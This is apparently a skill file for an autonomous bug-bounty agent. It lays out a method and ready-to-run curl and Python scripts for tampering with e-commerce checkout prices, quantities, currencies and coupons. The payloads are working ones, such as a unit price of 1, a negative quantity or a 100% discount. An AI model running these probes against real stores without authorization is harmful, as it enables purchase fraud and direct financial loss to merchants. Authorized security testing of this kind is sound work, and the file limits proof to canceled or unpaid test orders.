---
name: price_tamper
agent: agent8_logic
description: Prove server-side price trust failures — client-supplied amounts, currency mismatch, negative quantities, decimal truncation, and coupon stacking.
---

# Price Tamper

## Purpose
This skill finds pricing logic flaws where the server trusts client-supplied monetary values: price/amount fields in cart or order JSON, currency parameters, negative or zero quantities, decimal truncation, and coupon/discount stacking. Real impact is purchasing goods, credits, or services below their real price — a direct financial loss class that has produced many HackerOne payouts. Proof never completes actual fraud: demonstrate the tampered total on an unpaid, draft, or canceled test order and stop there.

## Division of labor
- **Consumes:** cart/checkout/order endpoints from `recon/endpoints_live.txt`, sample cart/order JSON from `recon/sample_responses/`, coupon-related endpoints from `race_condition` findings if present
- **Produces:** the finished artifact — `findings/price_tamper_confirmed.md` with raw request/response pairs and tampered-total evidence

## When to use / when NOT to use
- **Use when:** cart, checkout, invoice, or payment-intent JSON contains price-like fields (`price`, `amount`, `unitPrice`, `total`, `subtotal`, `currency`, `quantity`); the client sends a computed total the server echoes back; currency is a request parameter.
- **Skip when (time-pass filter):** the server recomputes totals from its own catalog and ignores client amounts (verify first — one probe decides this); prices are fixed server-side with signed line items; the flow needs a payment method you cannot test without real charge. Ask: does the tampered number change what the server bills? Is the delta real money? Can I prove it without completing fraud?

## Methodology
1. **Map the money flow.** Walk add-to-cart → cart → checkout → payment-intent/order in order, saving every request/response. Mark every field that carries money: `price`, `amount`, `unitPrice`, `total`, `subtotal`, `tax`, `shipping`, `discount`, `currency`, `quantity`. Note which side computes the total.
2. **Baseline: does the server trust the client total?** Replay the checkout request byte-identical (baseline), then replay with `total` reduced by 1 unit of currency. If the server accepts the lower total into the order/payment-intent, it trusts the client — proceed deep. If it recomputes and corrects you, record NEGATIVE for client-total trust and move to per-field tests.
3. **Per-line price tampering.** Intercept the add-to-cart or cart-update call and set `unitPrice`/`price` to 1 (or 0.01) for an expensive item. Read back the cart and the checkout summary: if the server prices the line at your number, escalate.
4. **Negative and zero quantities.** Send `quantity: -1`, `quantity: 0`, and `quantity: -100`. A negative line total that subtracts from the order total is the classic: add one expensive item plus one negative-quantity expensive item and watch the total collapse. Zero quantity with a free-gift or discount trigger is the quieter variant.
5. **Decimal truncation and rounding.** Send `quantity: 0.001` × 1000 units, or `price: 10.999`. Compare the line total vs the mathematically correct total. Truncation (floor instead of round) at scale creates free value; also try `quantity: 1e3` and `quantity: 0x10` — parsers that accept scientific/hex notation often compute differently than validators.
6. **Currency mismatch.** If `currency` is a request parameter, create the order in a strong currency (USD) then pay the captured amount in a weak one — or set `currency` to a code with a favorable server-side conversion table. Also try invalid/empty currency: fallback paths sometimes default to 1:1 or zero.
7. **Discount/coupon parameter injection.** Add unadvertised fields: `discount`, `discountPercent`, `promoAmount`, `couponValue`, `giftCardAmount`. Try `{"discount": 999999}` and `{"discountPercent": 100}` on cart-update and checkout. Harvest real field names from JS bundles first — don't guess blind.
8. **Coupon + price combos.** Apply a legitimate coupon AND a tampered price in the same order. Then try two coupons where the UI allows one (`coupon`, `coupon2`, `coupons: [...]`). Stacking that the UI forbids but the API allows is a finding.
9. **Gift-card / wallet balance tie-in.** If a gift-card or wallet-credit field exists, test applying credit greater than the order total (refund-to-card behavior?), and race the apply endpoint per the `race_condition` skill — the two skills stack here.
10. **Verify server-side vs client-side pricing decisively.** For each money field, run a 2×2: field present-modified vs field omitted, on cart-update vs checkout. The pattern that matters: omitted-field orders price correctly, modified-field orders price wrong — that isolates exactly which parameter the server trusts.
11. **Payment-intent capture.** Read the final payment-intent / order-confirmation response. The proof field is the server-stated `amount_to_charge` / `total` / `grandTotal` reflecting your tampered number. Screenshot-equivalent: save the full raw response.
12. **Proof-of-purchase evidence rules (no fraud).** NEVER complete a real payment with a tampered total. Proof = the server-generated unpaid order, draft invoice, or payment-intent showing the tampered charge amount. If the flow forces payment, use a test card / sandbox, or abandon at the last step and document the tampered amount the server was about to charge. Cancel any test order you created.
13. **Chaining.** A tampered total that flows into a raceable coupon-apply or a refundable wallet credit multiplies impact — hand the exact order/coupon IDs to the chaining agent.
14. **Write every vector up.** Each money field gets its own verdict with the 2×2 matrix result, raw pairs, and the tampered-total evidence (or the server-corrected total for NEGATIVEs).

## Exact commands
Baseline — map the money flow and capture a byte-identical checkout replay:
```bash
curl -s -b cookies_A.txt "https://<HOST>/api/cart" | python3 -m json.tool > /tmp/price_cart.json
grep -Eo '"(price|amount|unitPrice|unit_price|total|subtotal|tax|shipping|discount|currency|quantity)"' /tmp/price_cart.json | sort | uniq -c
# Save your legitimate checkout request body to /tmp/price_checkout_base.json for replay.
```
Client-total trust test (the 1-unit reduction probe):
```bash
python3 - <<'EOF'
import json, subprocess
base=json.load(open("/tmp/price_checkout_base.json"))
for k in ("total","grandTotal","amount","amount_total"):
    if k in base: base[k]=1  # reduce to 1 unit of currency
open("/tmp/price_checkout_tampered.json","w").write(json.dumps(base))
p=subprocess.run(["curl","-s","-b","cookies_A.txt","-X","POST","https://<HOST>/api/checkout",
    "-H","Content-Type: application/json","-d","@/tmp/price_checkout_tampered.json"],
    capture_output=True,text=True)
open("/tmp/price_total_trust.txt","w").write(p.stdout)
print(p.stdout[:600])
EOF
# CONFIRMED client-total trust only if the response order/payment-intent shows total=1 (or your number).
```
Per-line price tamper on cart-update:
```bash
curl -s -i -b cookies_A.txt -X PUT "https://<HOST>/api/cart/items/<ITEM_ID>" \
  -H 'Content-Type: application/json' -d '{"unitPrice":1,"quantity":1}' | head -c 500; echo
curl -s -b cookies_A.txt "https://<HOST>/api/cart" | grep -Eo '"(lineTotal|line_total|total)":[0-9.]+'
```
Negative/zero quantity probes:
```bash
for Q in -1 0 -100 0.001 1e3; do
  echo "=== quantity=$Q ==="
  curl -s -b cookies_A.txt -X PUT "https://<HOST>/api/cart/items/<ITEM_ID>" \
    -H 'Content-Type: application/json' -d "{\"quantity\":$Q}" \
    | grep -Eo '"(lineTotal|line_total|total|grandTotal)":-?[0-9.]+' | head -4
done
# Watch for a NEGATIVE lineTotal or a collapsed grandTotal.
```
Currency mismatch probe:
```bash
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/checkout" \
  -H 'Content-Type: application/json' \
  -d '{"cart_id":"<CART>","currency":"JPY","total":100}' | head -c 500; echo
# Then compare: same cart in USD. A 100 JPY order priced like 100 USD (or converted at a wrong rate) is the signal.
for C in USD EUR JPY "" XXX; do
  echo "=== currency=$C ==="
  curl -s -b cookies_A.txt -X POST "https://<HOST>/api/payment-intent" \
    -H 'Content-Type: application/json' -d "{\"cart_id\":\"<CART>\",\"currency\":\"$C\"}" \
    | grep -Eo '"(amount|currency|total)":("?[A-Za-z0-9.]+"?)' | head -3
done
```
Discount-parameter injection (harvest real names from JS first):
```bash
grep -Eo '"(discount|discountPercent|promoAmount|couponValue|giftCardAmount|storeCredit)"' \
  ~/workspace/recon/js_bundles/*.js 2>/dev/null | sort -u
curl -s -i -b cookies_A.txt -X PUT "https://<HOST>/api/cart" \
  -H 'Content-Type: application/json' \
  -d '{"discountPercent":100}' | head -c 500; echo
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/checkout" \
  -H 'Content-Type: application/json' \
  -d '{"cart_id":"<CART>","coupons":["<CODE1>","<CODE2>"]}' | head -c 600
```
2×2 isolation matrix (which parameter does the server actually trust?):
```bash
python3 - <<'EOF'
import json, subprocess
base=json.load(open("/tmp/price_checkout_base.json"))
def post(body):
    p=subprocess.run(["curl","-s","-b","cookies_A.txt","-X","POST",
        "https://<HOST>/api/checkout","-H","Content-Type: application/json",
        "-d",json.dumps(body)],capture_output=True,text=True)
    return p.stdout
for field in ("unitPrice","total","discountPercent","quantity"):
    for mode in ("modified","omitted"):
        b=dict(base); b.pop(field,None)
        if mode=="modified": b[field]=1 if field!="quantity" else -1
        r=post(b)
        import re
        tot=re.findall(r'"(?:total|grandTotal|amount_to_charge)":\s*"?(-?[0-9.]+)"?',r)
        print(f"{field:16} {mode:8} -> totals seen: {tot[:2]}")
EOF
# The field whose 'modified' row changes the total while 'omitted' prices correctly is the trusted one.
```
2x reproduction of the winning vector (save both raw outputs, then cancel the test order):
```bash
for RUN in 1 2; do
  curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/checkout" \
    -H 'Content-Type: application/json' -d @/tmp/price_checkout_tampered.json \
    -o /tmp/price_repro_$RUN.txt
  grep -Eo '"(total|grandTotal|amount_to_charge|order_id)":("?[A-Za-z0-9.-]+"?)' /tmp/price_repro_$RUN.txt | head -4
done
# CONFIRMED requires the tampered total in the server response in BOTH runs.
# Then cancel: extract order_id and void it — never leave a tampered order live.
OID=$(grep -o '"order_id":"[^"]*"' /tmp/price_repro_1.txt | head -1 | cut -d'"' -f4)
curl -s -b cookies_A.txt -X POST "https://<HOST>/api/orders/$OID/cancel" | head -c 200; echo
```

## Completion-bias defenses
- [ ] Money flow mapped end-to-end: every price-like field marked with who computes it
- [ ] Client-total trust tested (1-unit reduction replay) — trust or recompute recorded
- [ ] Per-line `unitPrice`/`price` tamper tested on cart-update
- [ ] Negative, zero, fractional, scientific-notation quantities tested (`-1`, `0`, `-100`, `0.001`, `1e3`)
- [ ] Decimal truncation/rounding compared against exact math
- [ ] Currency parameter tested: weak-currency, empty, invalid codes vs USD baseline
- [ ] Discount/coupon parameter injection tested with JS-harvested field names
- [ ] Coupon + tampered-price combos and multi-coupon stacking tested
- [ ] Gift-card/wallet over-apply tested; race tie-in considered
- [ ] 2×2 isolation matrix run per money field (modified vs omitted)
- [ ] Server-stated charge amount captured as proof (unpaid/draft order only — no real payment)
- [ ] Test orders canceled; no tampered order left live
- [ ] Every vector has a verdict with raw pairs in `findings/price_tamper_confirmed.md`
- **Review step:** agent10_review must verify for each CONFIRMED verdict: (1) the tampered total appears in a SERVER-generated response (not just echoed request JSON), (2) the 2×2 matrix isolates the trusted parameter, (3) both reproduction runs show the tampered amount, (4) no real payment was completed and test orders were canceled, and (5) currency claims show the actual conversion math, not just a different code string.
- **Nudge prompts:** "Keep going until you have tested every parameter, not just the first one that responded." / "Do not report done before the finished artifact exists on disk." / "The server echoing your number back is not proof — find the amount it intends to charge."
- **Finished artifact definition:** `findings/price_tamper_confirmed.md` exists and contains, per tested vector: the money-field inventory, the trust/recompute result, the 2×2 matrix, both reproduction outputs showing the server-stated tampered total, the cancellation evidence, and verdict CONFIRMED / INCONCLUSIVE / NEGATIVE.

## Evidence standard
- Baseline: compare every hit against a known-dead path on the same host
- Reproduction: 2x independent reproduction required
- Raw evidence: full request/response pairs saved
- Verdicts: CONFIRMED (meets all three) / INCONCLUSIVE (needs a second model run or human) / NEGATIVE (dead end, documented so nobody re-tests it)

## Handoffs
- `race_condition` consumes CONFIRMED coupon vectors: a working discount parameter is raceable — it needs the coupon/discount field name and the apply endpoint from the artifact.
- `mass_assignment` consumes CONFIRMED discount fields: unadvertised money fields hint at broader auto-binding — it needs the field names that the server accepted.
- `agent9_chain` consumes CONFIRMED tampered totals: a cheap order feeding a refundable wallet or resalable credit chains upward — it needs the order IDs (canceled) and the exact tampered-total math.
